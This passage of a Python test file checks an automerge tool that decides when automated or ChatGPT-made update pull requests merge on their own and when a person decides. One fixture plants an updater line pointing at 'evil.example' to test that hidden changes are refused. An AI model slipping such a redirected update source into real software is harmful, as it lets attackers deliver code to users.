    ("a module a person reads", lambda: fix_touching("ike/updater.py"), "person", "ike/updater.py"),
    ("an open security finding", lambda: cand(findings=["the sandbox tests failed on main (issue #5)"]),
     "person", merge.SECURITY_WHY),
    ("the update's commit beyond the update", lambda: cand(commits=[dict(MAINT, files=MAINT["files"] +
                                                                              ["ike/updater.py"]), FIX]),
     "person", "ike/updater.py: the update's commit may not change it"),
    ("a person's commit on the candidate", lambda: cand(commits=[MAINT, FIX, {"sha": "2" * 40, "files": [],
                                                                           "commit": {"message": "Fix by hand"}}]),
     "person", "a commit the automation did not write"),
    ("a commit's files not read", lambda: cand(commits=[dict(MAINT, files=None), FIX]),
     "person", "could not be read"),
    ("a file no commit accounts for", lambda: cand(files=CAND_FILES + [f("ike/tabs.py")]),
     "person", "no commit of the branch accounts for it"),
    ("version jump", lambda: cand(files=CAND_FILES[:3] + [f("ike/__init__.py", '@@ -5 +5 @@\n-__version__ = "1.1.19"\n'
                                                                                '+__version__ = "1.2.0"')]),
     "person", "the version jumps"),
    ("published, not raised", lambda: decide(pr(SECURITY_BRANCH), commits=[SECURITY_COMMIT],
                                             files=[f("ike-adblock/Cargo.lock", LOCK)], published=True),
     "person", "the version must be raised"),
    # 2026-11-22 (the owner's decision): M9's "one merge per unsigned version" became the version rule;
    # main holding an unsigned 1.1.19, a candidate raising it once more to 1.1.20 waits for a person
    # (the id of the case is kept: its reason still ends with "(M9)")
    ("main holds an unsigned merge", lambda: cand(unread=True, main_version="1.1.19"), "person", "(M9)"),
    ("maintenance commit on an update branch", lambda: decide(pr(SECURITY_BRANCH), commits=[MAINT],
                                                              files=[f("ike-adblock/Cargo.lock", LOCK)]),
     "person", "a trial or a maintenance candidate"),
])
def test_each_missing_piece_keeps_it_from_main_with_a_reason(case, got, kind, why):
    out = got()
    assert out[0] == kind and why in out[1], (case, out)


def test_open_security_findings():
    sandbox = {"number": 5, "labels": [{"name": "sandbox-failed"}]}
    rust = {"number": 6, "labels": [{"name": "rust-advisories"}]}
    ledger = {"entries": {"pypi:x@GHSA-1": {"security": True, "state": "blocked", "source_host": "api.osv.dev"},
                          "crate:y@RUSTSEC-1": {"security": True, "state": "detected", "source_host": "cargo-deny"},
                          "crate:z@RUSTSEC-2": {"security": True, "state": "passed", "source_host": "cargo-deny"},
                          "crate:w@1.2": {"state": "blocked"}}}
    assert merge.open_findings([], None, True) == []
    assert merge.open_findings([sandbox], None, True) == ["the sandbox tests failed on main (issue #5)"]
    # the advisories of main: open unless this commit's own cargo-deny passed (it is free of them)
    assert merge.open_findings([rust], None, False) == ["RustSec advisories (issue #6)"]
    assert merge.open_findings([rust], None, True) == []
    assert merge.open_findings([], ledger, True) == ["pypi:x@GHSA-1 (blocked in the maintenance ledger)"]
    assert len(merge.open_findings([], ledger, False)) == 2
    assert merge.open_findings([], "unreadable", True) == ["the maintenance ledger could not be read"]


def test_chatgpt_and_people_never_merge_by_themselves(monkeypatch, capsys):
    gpt = FULL_CHECKS + [{"name": "guard", "status": "completed", "conclusion": "success"}]
    for ref in ("chatgpt/fix-1", "chatgpt/automation/daily-maintenance"):
        assert decide(pr(ref), commits=[{"commit": {"message": "Fix"}}], checks=gpt)[0] == "ready"
    for ref in ("fix/1.1.22", "ui/1.1.22-desktops", "automation/verified-merge", "automation/update/",
                "automation/autofix-main-2", "automation/daily-maintenance-x", "main"):
        assert not merge.verified_branch(ref), ref
        assert decide(pr(ref), commits=[MAINT, FIX], files=CAND_FILES)[0] == "person", ref
    # a person's pull request is not even read: main() finds none of the automation or of ChatGPT
    calls = []
    person = dict(pr("fix/1.1.22"), number=12)
    monkeypatch.setattr(merge, "api", lambda path: [person] if "pulls?state=open" in path else calls.append(path))
    monkeypatch.setattr(merge, "gh", lambda *a: calls.append(a))
    merge.main(["--repo", REPO, "--sha", "a" * 40])
    assert "no pull request of the automation or of ChatGPT" in capsys.readouterr().out and not calls


def _main_world(monkeypatch, p, commits, files, checks, arch_runs=1, behind=0):
    calls = []

    def api(path):
        calls.append(("api", path))
        if path.startswith("repos/o/r/pulls?"):
            return [p]
        if path.endswith("/pulls/7/commits?per_page=100"):
            return [{k: v for k, v in c.items() if k != "files"} for c in commits]
        if path.endswith("/pulls/7/files?per_page=100"):
            return [dict(x) for x in files]
        for c in commits:
            if path == "repos/o/r/commits/%s" % c["sha"]:
                return {"files": [{"filename": n} for n in c["files"]]}
        if "/check-runs" in path:
            return {"check_runs": checks}
        if "actions/workflows/arch.yml/runs" in path:
            return {"total_count": arch_runs}
        if path.startswith("repos/o/r/compare/main..."):
            return {"behind_by": behind}                  # the refresh: up to date with main unless said
        raise AssertionError(path)
    monkeypatch.setattr(merge, "api", api)
    monkeypatch.setattr(merge, "gh", lambda *a: calls.append(("gh",) + a) or "[]")
    monkeypatch.setattr(merge, "file_at", lambda repo, name, ref: BASE if ref == "b" * 40
                        else BASE.replace("return 1", "return 2"))
    # main's 1.1.19 is published and the candidate raises it to 1.1.20 (the version rule)
    monkeypatch.setattr(merge, "released", lambda *a: True)
    monkeypatch.setattr(merge, "version_of_main", lambda: "1.1.19")
    monkeypatch.setattr(merge, "unread_merge", lambda *a: False)
    monkeypatch.setattr(merge, "gather_evidence", lambda repo, sha: VERIFIED)
    monkeypatch.setattr(merge, "gather_findings", lambda repo, passed: [])
    return calls


def test_after_a_merge_the_release_notice_starts(monkeypatch):
    """A fully verified candidate, through main(): merged at exactly its commit with the workflow's
    token, then main's Tests, Security and Arch Linux start; their merge-ready jobs on main ask
    release-ready.yml, which tells the owner a version is ready to sign."""
    sha = "c" * 40
    p = dict(pr(CAND), head={"ref": CAND, "sha": sha, "repo": {"full_name": "o/r"}}, base={"ref": "main",
                                                                                         "sha": "b" * 40})
    calls = _main_world(monkeypatch, p, [MAINT, FIX], CAND_FILES, FULL_CHECKS)
    assert merge.main(["--repo", "o/r", "--sha", sha]) == 0
    flat = [" ".join(map(str, c[1:])) for c in calls if c[0] == "gh"]
    put = [c for c in flat if c.startswith("api -X PUT repos/o/r/pulls/7/merge")]
    assert len(put) == 1 and "merge_method=merge" in put[0] and "sha=" + sha in put[0], flat
    assert "(merged by itself" in put[0]                               # listed in the signing notice
    assert flat.index("pr ready 7 --repo o/r") < flat.index(put[0])    # a draft is made ready first
    for workflow in ("tests.yml", "security.yml", "arch.yml"):
        assert "workflow run %s --repo o/r --ref main" % workflow in flat, flat
    # Arch Linux had run on the commit: not started again
    assert not any(c.startswith("workflow run arch.yml --repo o/r --ref " + CAND) for c in flat)
    tests, sec = (WORKFLOWS / "tests.yml").read_text(), (WORKFLOWS / "security.yml").read_text()
    for text in (tests, sec):
        ready = text.split("\n  merge-ready:\n", 1)[1]
        assert "github.ref_name == 'main'" in ready and "gh workflow run release-ready.yml --ref main" in ready
        assert "github.ref_name == 'automation/daily-maintenance'" in ready
        assert "startsWith(github.ref_name, 'automation/update/')" in ready
    rr = (WORKFLOWS / "release-ready.yml").read_text()
    assert "workflow_dispatch:" in rr and "for check in tests sandbox" in rr


def test_a_candidate_short_of_verified_names_the_owner_once(monkeypatch):
    sha = "c" * 40
    p = dict(pr(CAND), head={"ref": CAND, "sha": sha, "repo": {"full_name": "o/r"}}, base={"ref": "main",
                                                                                         "sha": "b" * 40})
    calls = _main_world(monkeypatch, p, [MAINT, FIX], CAND_FILES, FULL_CHECKS, arch_runs=0)
    monkeypatch.setattr(merge, "gather_findings", lambda repo, passed: ["RustSec advisories (issue #6)"])
    merge.main(["--repo", "o/r", "--sha", sha])
    flat = [" ".join(map(str, c[1:])) for c in calls if c[0] == "gh"]
    assert not any("/merge" in c for c in flat), flat
    # Arch Linux had not run on the commit: started on its branch
    assert "workflow run arch.yml --repo o/r --ref " + CAND in flat
    said = [c for c in flat if c.startswith("pr comment 7")]
    assert len(said) == 1 and "@o:" in said[0] and merge.SECURITY_WHY in said[0]
    assert merge.VERDICT % (sha, "security") in said[0]


def test_the_one_comment_is_edited_not_repeated(monkeypatch):
    calls, said = [], []

    def gh(*a):
        calls.append(a)
        return json.dumps(said)
    monkeypatch.setattr(merge, "gh", gh)
    merge.tell_person("o/r", 7, "the check tests did not pass", "owner", "c" * 40)
    assert calls[-1][:2] == ("pr", "comment") and "@owner:" in calls[-1][-1]
    said.append({"id": 55, "body": calls[-1][-1]})
    calls.clear()
    merge.tell_person("o/r", 7, "the check tests did not pass", "owner", "c" * 40)
    assert len(calls) == 1                                               # the same: nothing written
    merge.tell_person("o/r", 7, "not fully verified: old-cpu failed", "owner", "d" * 40)
    assert calls[-1][:4] == ("api", "-X", "PATCH", "repos/o/r/issues/comments/55")
    assert merge.VERDICT % ("d" * 40, "person") in calls[-1][-1]
    assert not any(c[:2] == ("pr", "comment") for c in calls[1:])


def test_the_ledger_shows_why_it_waits():
    """Short of fully verified: needs-person in the ledger; an open security finding: blocked."""
    ledger = load("maintenance-ledger")
    sha = "c" * 40
    base = {"sha": sha, "pr": 43, "runs": runs(), "skips": []}
    assert ledger._candidate_verdict({"candidate": base}, ["crate"])[0] == "passed"
    held = dict(base, merge={"sha": sha, "verdict": "person", "why": "not fully verified: old-cpu failed"})
    state, reason, _url = ledger._candidate_verdict({"candidate": held}, ["crate"])
    assert state == "needs-person" and "old-cpu failed" in reason and "#43" in reason
    blocked = dict(base, merge={"sha": sha, "verdict": "security", "why": "x"})
    assert ledger._candidate_verdict({"candidate": blocked}, ["crate"])[0] == "blocked"
    older = dict(base, merge={"sha": "d" * 40, "verdict": "person", "why": "x"})      # an older commit's verdict
    assert ledger._candidate_verdict({"candidate": older}, ["crate"])[0] == "passed"
    # read back from the one comment (GET calls only)
    body = merge.person_text(43, "not fully verified: old-cpu failed", "o", sha)

    def api(path, method="GET", data=None, raw=False):
        assert method == "GET"
        if "/pulls?" in path:
            return [{"number": 43, "html_url": "u", "head": {"sha": sha}}]
        if path.endswith("/issues/43/comments?per_page=100"):
            return [{"user": {"login": "someone"}, "body": merge.VERDICT % (sha, "security")},
                    {"user": {"login": "github-actions[bot]"}, "body": body}]
        if "/runs?" in path:
            return {"workflow_runs": []}
        if "/compare/" in path:
            return {"commits": []}
        if "/issues?" in path:
            return []
        raise RuntimeError("HTTP 404")
    cand_ = ledger.gather("o/r", api)["candidate"]
    assert cand_["merge"] == {"sha": sha, "verdict": "person", "why": "not fully verified: old-cpu failed"}


def test_arch_linux_runs_on_the_candidate(monkeypatch):
    """Arch Linux must have passed on the commit: daily-maintenance.yml starts it on the candidate,
    tools/automerge.py on any branch of the automation where it has not run, and arch.yml asks for
    the merge (and hands a failure on the candidate to the automatic fix)."""
    daily = (WORKFLOWS / "daily-maintenance.yml").read_text()
    publish = daily.split("\n  publish-candidate:\n", 1)[1]
    assert publish.count("gh workflow run arch.yml --ref automation/daily-maintenance") == 2
    assert "actions/workflows/arch.yml/runs?head_sha=$published" in publish
    arch = (WORKFLOWS / "arch.yml").read_text()
    ready = arch.split("\n  merge-ready:\n", 1)[1]
    assert "github.ref_name == 'automation/daily-maintenance'" in ready
    assert "startsWith(github.ref_name, 'automation/update/')" in ready
    hand = arch.split("\n  hand-over:\n", 1)[1].split("\n  merge-ready:\n", 1)[0]
    assert "github.ref_name == 'automation/daily-maintenance'" in hand
    calls = []
    monkeypatch.setattr(merge, "gh", lambda *a: calls.append(a))
    monkeypatch.setattr(merge, "api", lambda path: {"total_count": 0})
    assert merge.ensure_arch("o/r", CAND, "c" * 40) is True
    assert calls == [("workflow", "run", "arch.yml", "--repo", "o/r", "--ref", CAND)]
    monkeypatch.setattr(merge, "api", lambda path: {"total_count": 1})
    assert merge.ensure_arch("o/r", CAND, "c" * 40) is False and len(calls) == 1


def test_the_update_may_change_what_the_candidate_check_allows():
    """tools/automerge.py and daily-maintenance.yml agree on what an update may change."""
    allowed = re.search(r"ALLOWED = \((.*?)\)\n", _candidate_check(), re.S).group(1)
    assert tuple(re.findall(r'"([^"]+)"', allowed)) == merge.UPDATE_FILES
    assert merge.VERSION_FILES == ("ike/__init__.py", "PKGBUILD", "README.md", "CHANGELOG.md")


def test_what_a_merge_needs_from_the_test_categories():
    for kind in ("crate", "pypi-test", "integrated", "npm"):
        need = tc.merge_required([kind])
        assert set(tc.MERGE_ALWAYS) <= set(need) and "arch-packaging" in need and "sandbox" in need
        assert "licences" in need and "advisories" in need and "tests-kept" in need
    assert "filter-lists" in tc.merge_required(["adblock-engine"])
    assert "desktop" in tc.merge_required(["arch-optional"])            # never run by GitHub: never by itself
    rows = tc.verify(tc.merge_required(["arch-optional"]), tc.results_from_runs(runs()), [])
    assert tc.verdict(rows) == "not verified"
    assert tc.unexpected_skips(EXPECTED) == [] and tc.unexpected_skips(EXPECTED + [SKIPPED_FFMPEG]) == [SKIPPED_FFMPEG]
    assert tc.unexpected_skips([{"reason": "desktop gnome: GTK 3 is not installed"}]) == []
    assert tc.unexpected_skips([{"reason": ""}]) == [{"reason": ""}]


def test_the_token_rights_are_the_least_needed():
    """automerge.yml: nothing at the top; one job, from main's own copy of the rules, with the right to
    write the contents only for the merge; the jobs that ask for the merge only start workflows."""
    am = (WORKFLOWS / "automerge.yml").read_text()
    assert "\npermissions: {}\n" in am
    jobs = re.split(r"^  ([a-z-]+):\n", am.split("\njobs:\n", 1)[1], flags=re.M)
    assert jobs[1::2] == ["merge"]
    rights = dict(re.findall(r"^      ([a-z-]+): (read|write)\b", jobs[2].split("permissions:\n", 1)[1]
                             .split("    steps:", 1)[0], re.M))
    assert rights == {"contents": "write", "pull-requests": "write", "issues": "read", "actions": "write",
                      "checks": "read"}
    assert am.count("contents: write") == 1
    assert "ref: main" in jobs[2] and "persist-credentials: false" in jobs[2]
    assert "python3 -I tools/automerge.py" in jobs[2] and "pull_request_target" not in am
    for name in ("tests.yml", "security.yml", "arch.yml"):
        job = (WORKFLOWS / name).read_text().split("\n  merge-ready:\n", 1)[1]
        job = re.split(r"\n  [a-z-]+:\n", job, maxsplit=1)[0]
        assert "permissions:\n      actions: write\n    steps:" in job, name
        assert "github.actor == 'github-actions[bot]'" in job and "contents:" not in job, name
    assert "permissions: {}" in (WORKFLOWS / "release-ready.yml").read_text()


# --- everything automatic and verified converges into main (2026-11-22, the owner's decision) ------
# Several verified merges go into one unpublished version (M9 dropped for the automation's own pull
# requests; a second raise on top waits), a verified candidate behind main is refreshed (main merged
# into its branch, CHANGELOG and version files resolved, anything else for a person), the refresh
# commit is checked again from git, the others are judged again after each merge, and the owner gets
# one notice per version.

DARK = "automation/update/darkreader"
DARK_COMMIT = {"sha": "d" * 40, "commit": {"message": "update: darkreader 4.9.135 -> 4.9.136 (no AI)\n\nMade by"},
               "files": ["ike/resources/darkreader-data.json", "ike/__init__.py", "PKGBUILD", "README.md",
                         "CHANGELOG.md"]}
DARK_BULLET = "- Dark Reader (engine and lists): 4.9.135 -> 4.9.136"
DARK_DATA = f("ike/resources/darkreader-data.json", '@@ -1 +1 @@\n-{"a": 1}\n+{"a": 2}')


def raise_to(old, new, heading=True):
    """The version files of a candidate made by tools/prepare-maintenance.py (old -> new)."""
    log = "@@ -2,0 +3,3 @@\n+## %s\n+\n+%s" % (new, DARK_BULLET) if heading else "@@ -4,0 +5 @@\n+" + DARK_BULLET
    return [f("ike/__init__.py", '@@ -5 +5 @@\n-__version__ = "%s"\n+__version__ = "%s"' % (old, new)),
            f("PKGBUILD", "@@ -6 +6 @@\n-pkgver=%s\n+pkgver=%s" % (old, new)),
            f("README.md", "@@ -12 +12 @@\n-**Version %s** - see [CHANGELOG.md](CHANGELOG.md).\n"
                           "+**Version %s** - see [CHANGELOG.md](CHANGELOG.md)." % (old, new)),
            f("CHANGELOG.md", log)]


def dark(files, commits=(DARK_COMMIT,), **kw):
    kw.setdefault("main_version", "1.1.23")
    return decide(pr(DARK), commits=list(commits), files=files, **kw)


def refresh_commit(verdict=""):
    c = {"sha": "5" * 40, "commit": {"message": "refresh: main %s into %s (tools/automerge.py, no AI)\n\nx"
                                                % ("6" * 40, DARK)}, "files": ["ike-adblock/Cargo.lock"]}
    if verdict is not None:
        c["refresh"] = verdict
    return c


def test_several_verified_merges_go_into_one_unpublished_version():
    """main already holds 1.1.23 merged by itself and not signed (unread): the next verified candidate
    of the same version merges too (M9 asserted "person" here; the owner's decision replaced it)."""
    # made before main was raised: it raises 1.1.22 -> 1.1.23, main's own unpublished version
    assert dark([DARK_DATA] + raise_to("1.1.22", "1.1.23"), unread=True) == ("merge", "")
    # refreshed with main: nothing of the version left to raise, only its CHANGELOG line
    after = [DARK_DATA, f("CHANGELOG.md", "@@ -4,0 +5 @@\n+" + DARK_BULLET)]
    assert dark(after, commits=[DARK_COMMIT, refresh_commit()], unread=True) == ("merge", "")
    # the test packages ship nothing: they go in whatever main's version is
    libs = {"sha": "1" * 40, "commit": {"message": "update: test-libs certifi 1 -> certifi 2 (no AI)"},
            "files": ["tools/test-requirements.txt"]}
    req = [f("tools/test-requirements.txt", "@@ -1 +1 @@\n-certifi==1\n+certifi==2")]
    for published in (False, True):
        assert decide(pr("automation/update/test-libs"), commits=[libs], files=req, unread=True,
                      published=published, main_version="1.1.23") == ("merge", "")
    # main's version published: the first candidate raises it to the next one
    assert dark([DARK_DATA] + raise_to("1.1.22", "1.1.23"), published=True, main_version="1.1.22") == ("merge", "")


def test_a_second_version_raise_is_refused():
    cases = {
        # 1.1.24 while 1.1.23 is not published
        "second raise": dark([DARK_DATA] + raise_to("1.1.23", "1.1.24")),
        # main's 1.1.23 published meanwhile: the candidate's 1.1.23 would never reach the users
        "published same": dark([DARK_DATA] + raise_to("1.1.22", "1.1.23"), published=True),
        # a CHANGELOG heading of another version than main's unpublished one, with no raise
        "other heading": dark([DARK_DATA, f("CHANGELOG.md", "@@ -2,0 +3,3 @@\n+## 1.1.24\n+\n+" + DARK_BULLET)]),
        # main's version not readable: no merge
        "unknown": dark([DARK_DATA] + raise_to("1.1.22", "1.1.23"), main_version=""),
    }
    assert cases["second raise"] == ("person", "a second version raise: main's 1.1.23 is not published yet and "
                                               "the pull request sets 1.1.24; it goes into 1.1.23, signed first (M9)")
    assert cases["published same"][1].startswith("main's version 1.1.23 is published already: the version must be "
                                                 "raised to 1.1.24")
    assert "a heading of another version (1.1.24" in cases["other heading"][1]
    assert cases["unknown"] == ("person", "main's version could not be read")
    assert all(v[0] == "person" for v in cases.values()), cases
    assert merge.next_version("1.1.23") == "1.1.24" and merge.version_rule([], "1.1.23", False) == ""


def test_the_changelog_union_is_exact():
    base = "# Changelog\n\n## 1.1.22\n\nTwo things:\n\n- old one\n"
    main = "# Changelog\n\n## 1.1.23\n\n- Rust crates: 88 -> 88\n\n## 1.1.22\n\nTwo things:\n\n- old one\n"
    ours = "# Changelog\n\n## 1.1.23\n\n%s\n\n## 1.1.22\n\nTwo things:\n\n- old one\n" % DARK_BULLET
    text, why = merge.changelog_union(base, ours, main, "1.1.23")
    assert why == "" and text == ("# Changelog\n\n## 1.1.23\n\n- Rust crates: 88 -> 88\n%s\n\n## 1.1.22\n\n"
                                  "Two things:\n\n- old one\n" % DARK_BULLET)
    # a line both have is there once
    both = ours.replace(DARK_BULLET, DARK_BULLET + "\n- Rust crates: 88 -> 88")
    assert merge.changelog_union(base, both, main, "1.1.23") == (text, "")
    assert merge.changelog_union(main, text, text, "1.1.23") == (text, "")
    # more than new bullet lines of that version, or main's first section another version: a person
    assert merge.changelog_union(base, base.replace("- old one", "- changed"), main, "1.1.23")[0] == ""
    assert merge.changelog_union(base, ours.replace("- Dark", "Some text\n- Dark"), main, "1.1.23")[0] == ""
    assert merge.changelog_union(base, ours, base, "1.1.23")[1] == "CHANGELOG.md: main's has no single ## 1.1.23 section"


def _world(tmp_path):
    """A repository like I.K.E.'s: 1.1.22 published; the crates' candidate merged into main (1.1.23,
    unpublished); the Dark Reader and uBlock Origin candidates made from the old main."""
    import subprocess
    import sys
    repo = tmp_path / "r"
    repo.mkdir()

    def git(*a):
        return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=repo, check=True,
                              capture_output=True, text=True).stdout.strip()

    def write(name, text):
        (repo / name).parent.mkdir(parents=True, exist_ok=True)
        (repo / name).write_text(text)

    def candidate(branch, start, files, bullet):
        git("checkout", "-q", "-B", branch, start)
        for name, text in files.items():
            write(name, text)
        subprocess.run([sys.executable, str(ROOT / "tools/prepare-maintenance.py"), "--root", str(repo),
                        "--base-version", "1.1.22", "--bullet", bullet], check=True, capture_output=True)
        git("add", "-A")
        git("commit", "-q", "-m", "update: %s a -> b (no AI)" % branch.rsplit("/", 1)[-1])
        return git("rev-parse", "HEAD")
    git("init", "-q", "-b", "main")
    write("CHANGELOG.md", "# Changelog\n\n## 1.1.22\n\nTwo things:\n\n- old one\n")
    write("ike/__init__.py", '"""I.K.E."""\n\n__version__ = "1.1.22"\n')
    write("PKGBUILD", "pkgname=ike-browser\npkgver=1.1.22\npkgrel=1\n")
    write("README.md", "# I.K.E.\n\n**Version 1.1.22** - see [CHANGELOG.md](CHANGELOG.md).\n\n"
                       "    sudo pacman -U ike-browser-1.1.22-1-x86_64.pkg.tar.zst\n")
    for name in ("ike/resources/darkreader-data.json", "ike/resources/ubo-scriptlets.json", "ike-adblock/Cargo.lock"):
        write(name, "old\n")
    git("add", "-A")
    git("commit", "-q", "-m", "1.1.22")
    old = git("rev-parse", "HEAD")
    crates = candidate("automation/update/crates", old, {"ike-adblock/Cargo.lock": "new\n"}, "- Rust crates: 88 -> 88")
    dark_sha = candidate(DARK, old, {"ike/resources/darkreader-data.json": "new\n"}, DARK_BULLET)
    ubo = candidate("automation/update/ubo-scriptlets", old, {"ike/resources/ubo-scriptlets.json": "ubo\n"},
                    "- uBlock Origin scriptlets: a -> b")
    git("checkout", "-q", "main")
    git("merge", "-q", "--no-ff", "-m", "Merge pull request #107 (merged by itself: fully verified)", crates)
    git("update-ref", "refs/remotes/origin/main", "main")
    return repo, git, {"old": old, "dark": dark_sha, "ubo": ubo, "main": git("rev-parse", "main")}


def test_a_verified_candidate_behind_main_is_refreshed_exactly(tmp_path):
    """The refresh of the Dark Reader candidate after the crates' merge: main merged in, one "## 1.1.23"
    heading with both lines (exactly what tools/prepare-maintenance.py writes when it adds to an
    unpublished version), the version files as main's, the candidate's own file kept; the commit is
    accepted by the merge's check."""
    import subprocess
    import sys
    repo, git, sha = _world(tmp_path)
    assert subprocess.run(["git", "merge-tree", "--write-tree", sha["dark"], sha["main"]], cwd=repo,
                          capture_output=True).returncode == 1           # it does conflict on CHANGELOG.md
    commit, why = merge.make_refresh(DARK, sha["dark"], sha["main"], cwd=repo)
    assert why == "" and commit
    # what prepare-maintenance.py makes of the same line on top of main (--keep-version)
    git("checkout", "-q", "-B", "expected", "main")
    subprocess.run([sys.executable, str(ROOT / "tools/prepare-maintenance.py"), "--root", str(repo),
                    "--base-version", "1.1.23", "--keep-version", "--bullet", DARK_BULLET], check=True,
                   capture_output=True)
    expected = (repo / "CHANGELOG.md").read_text()
    assert expected == ("# Changelog\n\n## 1.1.23\n\n- Rust crates: 88 -> 88\n%s\n\n## 1.1.22\n\nTwo things:\n\n"
                        "- old one\n" % DARK_BULLET)
    assert git("show", "%s:CHANGELOG.md" % commit) + "\n" == expected
    git("checkout", "-q", "--", ".")
    for name in ("ike/__init__.py", "PKGBUILD", "README.md", "ike-adblock/Cargo.lock"):
        assert git("show", "%s:%s" % (commit, name)) == git("show", "main:%s" % name), name
    assert git("show", "%s:ike/resources/darkreader-data.json" % commit) == "new"
    assert git("rev-list", "--parents", "-n", "1", commit).split()[1:] == [sha["dark"], sha["main"]]
    assert merge.refresh_problem(commit, DARK, cwd=repo) == ""
    # against main, the refreshed candidate changes only its own file and adds its CHANGELOG line
    assert git("diff", "--name-only", "main", commit).split() == ["CHANGELOG.md", "ike/resources/darkreader-data.json"]
    # a version file in conflict (main's README changed beside the version line): main's, as decided
    git("checkout", "-q", "main")
    readme = (repo / "README.md").read_text().replace("**Version 1.1.23** - see", "**Version 1.1.23** - read")
    (repo / "README.md").write_text(readme)
    git("commit", "-q", "-am", "readme")
    git("update-ref", "refs/remotes/origin/main", "main")
    main2 = git("rev-parse", "main")
    assert subprocess.run(["git", "merge-tree", "--write-tree", "--name-only", "--no-messages", sha["dark"], main2], cwd=repo,
                          capture_output=True, text=True).stdout.split()[1:] == ["CHANGELOG.md", "README.md"]
    again, why = merge.make_refresh(DARK, sha["dark"], main2, cwd=repo)
    assert why == "" and git("show", "%s:README.md" % again) + "\n" == readme
    assert merge.refresh_problem(again, DARK, cwd=repo) == ""


def test_a_conflict_beyond_changelog_and_version_goes_to_a_person(tmp_path, monkeypatch):
    repo, git, sha = _world(tmp_path)
    # main gets another uBlock Origin change: the candidate's scriptlets conflict with it
    git("checkout", "-q", "main")
    (repo / "ike/resources/ubo-scriptlets.json").write_text("someone else's\n")
    git("commit", "-q", "-am", "scriptlets")
    main2 = git("rev-parse", "main")
    git("update-ref", "refs/remotes/origin/main", main2)
    commit, why = merge.make_refresh("automation/update/ubo-scriptlets", sha["ubo"], main2, cwd=repo)
    assert commit == "" and why == "ike/resources/ubo-scriptlets.json: a conflict with main that a person resolves"
    # a second raise is not resolved either: the candidate on 1.1.24 while main holds 1.1.23
    git("checkout", "-q", "-B", "second", "main")
    (repo / "ike/__init__.py").write_text('"""I.K.E."""\n\n__version__ = "1.1.24"\n')
    (repo / "CHANGELOG.md").write_text((repo / "CHANGELOG.md").read_text().replace(
        "## 1.1.23\n", "## 1.1.24\n\n- x\n\n## 1.1.23\n", 1))
    git("commit", "-q", "-am", "update: darkreader a -> b (no AI)")
    git("checkout", "-q", "main")
    (repo / "CHANGELOG.md").write_text((repo / "CHANGELOG.md").read_text().replace("- Rust", "- Other\n- Rust"))
    git("commit", "-q", "-am", "log")
    assert "is not main's 1.1.23" in merge.make_refresh(DARK, git("rev-parse", "second"), git("rev-parse", "main"),
                                                         cwd=repo)[1]
    # through main(): the owner is named once with the reason (the ledger reads its mark); no merge
    p = dict(pr("automation/update/ubo-scriptlets"),
             head={"ref": "automation/update/ubo-scriptlets", "sha": "c" * 40, "repo": {"full_name": "o/r"}},
             base={"ref": "main", "sha": "b" * 40})
    ubo = {"sha": "3" * 40, "commit": {"message": "update: ubo-scriptlets a -> b (no AI)"},
           "files": ["ike/resources/ubo-scriptlets.json"]}
    calls = _main_world(monkeypatch, p, [ubo], [f("ike/resources/ubo-scriptlets.json", "@@ -1 +1 @@\n-a\n+b")],
                        FULL_CHECKS, behind=3)
    conflict = "ike/resources/ubo-scriptlets.json: a conflict with main that a person resolves"
    monkeypatch.setattr(merge, "released", lambda *a: False)          # main's 1.1.19 not published: nothing to raise
    monkeypatch.setattr(merge, "refresh_branch", lambda repo_, ref, s: ("", conflict))
    assert merge.main(["--repo", "o/r", "--sha", "c" * 40]) == 0
    flat = [" ".join(map(str, c[1:])) for c in calls if c[0] == "gh"]
    assert not any("/merge" in c for c in flat), flat
    said = [c for c in flat if c.startswith("pr comment 7")]
    assert len(said) == 1 and "@o:" in said[0] and conflict in said[0]
    assert merge.VERDICT % ("c" * 40, "person") in said[0]


def test_the_refresh_commit_is_accepted_and_a_disguised_one_refused(tmp_path):
    repo, git, sha = _world(tmp_path)
    good, why = merge.make_refresh(DARK, sha["dark"], sha["main"], cwd=repo)
    assert why == "" and merge.refresh_problem(good, DARK, cwd=repo) == ""
    message = git("log", "-1", "--format=%B", good)
    tree = git("rev-parse", good + "^{tree}")

    def commit(tree_, *parents, msg=message):
        return git("commit-tree", tree_, *[x for p in parents for x in ("-p", p)], "-m", msg)
    # one more change hidden in the merge
    git("checkout", "-q", "-B", "hide", good)
    (repo / "ike/updater.py").write_text("SOURCE = 'https://evil.example/update.json'\n")
    git("add", "-A")
    git("commit", "-q", "-m", "x")
    hidden = commit(git("rev-parse", "HEAD^{tree}"), sha["dark"], sha["main"])
    # a "main" that is not main's
    side = git("commit-tree", git("rev-parse", "main^{tree}"), "-p", sha["main"], "-m", "side")
    on_side = commit(tree, sha["dark"], side, msg=message.replace(sha["main"], side))
    cases = {
        "hidden change": merge.refresh_problem(hidden, DARK, cwd=repo),
        "one parent": merge.refresh_problem(commit(tree, sha["dark"]), DARK, cwd=repo),
        "parents swapped": merge.refresh_problem(commit(tree, sha["main"], sha["dark"]), DARK, cwd=repo),
        "not main": merge.refresh_problem(on_side, DARK, cwd=repo),
        "other branch": merge.refresh_problem(good, "automation/update/crates", cwd=repo),
        "plain message": merge.refresh_problem(commit(tree, sha["dark"], sha["main"], msg="Merge main"), DARK,
                                               cwd=repo),
    }
    assert cases["hidden change"] == "more than main merged in with the CHANGELOG and version resolutions"
    assert cases["one parent"] == "not a merge of the branch and main"
    assert cases["not main"] == "the main it names is not in main"
    assert all(cases.values()), cases
    # decide(): a refresh commit counts only with its verdict "" from git (main() computes it)
    after = [DARK_DATA, f("CHANGELOG.md", "@@ -4,0 +5 @@\n+" + DARK_BULLET)]
    assert dark(after, commits=[DARK_COMMIT, refresh_commit("")]) == ("merge", "")
    for verdict in (cases["hidden change"], None):
        kind, why = dark(after, commits=[DARK_COMMIT, refresh_commit(verdict)])
        assert kind == "person" and why.startswith("a refresh commit that is not main merged in as decided"), why
    # a refresh commit accounts for no file by itself
    kind, why = dark(after + [f("ike/resources/ubo-scriptlets.json")], commits=[DARK_COMMIT, refresh_commit("")])
    assert kind == "person" and "no commit of the branch accounts for it" in why


def test_the_refresh_is_pushed_to_the_candidates_branch_only(tmp_path, monkeypatch):
    """refresh_branch(): fetched without credentials, pushed as a fast-forward of that branch (never
    main), then Tests, Security and Arch Linux started on it (the token's push starts nothing)."""
    import subprocess
    repo, git, sha = _world(tmp_path)
    origin = tmp_path / "origin.git"
    subprocess.run(["git", "clone", "-q", "--bare", str(repo), str(origin)], check=True)
    git("remote", "add", "origin", str(origin))
